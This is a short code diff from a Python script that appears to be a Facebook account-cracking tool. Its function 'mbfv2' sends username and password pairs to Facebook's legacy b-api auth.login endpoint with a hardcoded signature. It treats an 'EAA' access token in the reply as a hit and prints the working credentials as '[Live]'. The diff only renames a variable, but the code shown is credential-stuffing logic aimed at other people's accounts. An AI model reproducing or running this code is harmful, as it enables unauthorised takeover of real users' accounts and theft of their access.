@@ -183,8 +183,8 @@ def mbfv2():
                      'generate_session_cookies': '1',
                      'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
              }
-             api = 'https://b-api.facebook.com/method/auth.login'
-             response = requests.get(api, params=params)
+             bapi = 'https://b-api.facebook.com/method/auth.login'
+             response = requests.get(bapi, params=params)
              if 'EAA' in response.text:
                  print(f"\r\033[1;92m  * \033[90m[\033[92mLive\033[90m]👉\033[92m {username}[-]{password}                       ",end="")
                  print()
